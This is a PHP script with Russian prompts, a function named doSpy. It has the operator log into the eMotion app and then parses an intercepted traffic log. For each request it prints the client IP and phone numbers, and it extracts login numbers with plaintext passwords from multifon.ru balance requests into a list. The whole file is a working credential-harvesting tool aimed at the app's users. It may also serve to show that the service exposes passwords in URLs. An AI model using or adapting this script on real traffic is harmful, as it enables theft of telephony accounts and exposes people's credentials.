<?php
function doSpy() {
    echo "Установите и войдите в приложение eMotion, введя телефон и код с СМС. ".PHP_EOL;
    echo "Вы сделали это? (Допустимо: да, нет)".PHP_EOL;
    $filename = "/fumotion/logs/emotion.log";
    if (strtolower(readline(""))=="да") {
        $json = explode(PHP_EOL, file_get_contents("/fumotion/logs/emotion.log"));
        foreach($json as $request) {
            $request = json_decode(str_replace("},","}",$request),true);
            echo "IP адрес {$request['remote_addr']} ";
            $request['request'] = explode(" ",$request['request']);
            switch($request['request'][0]) {
                case 'POST':
                    if (stristr($request['request'][1],"/api/v15/ident")) {
                        echo "запросил авторизацию для номера ".str_replace("/api/v15/ident/","",$request['request'][1]).PHP_EOL;
                    }
                    elseif (stristr($request['request'][1],"/sm/client/balance")) {
                        $numlog = explode(" ",str_replace(["/sm/client/balance?login=","%40multifon.ru","&password="],["",""," "], $request['request'][1]));
                        echo "запросил баланс для номера {$numlog[0]} и пароль {$numlog[1]}";
                        $usernames[$numlog[0]] = $numlog[1];
                    }
                    elseif (stristr($request['request'][1],"/api/v15/login")) {
                        echo "запросил общую авторизацию";
                    }
                    elseif (stristr($request['request'][1],"/api/v15/verify")) {
                        echo "запросил проверку номера";
                    }
                break;
            }
            echo PHP_EOL;
        }
    }
}
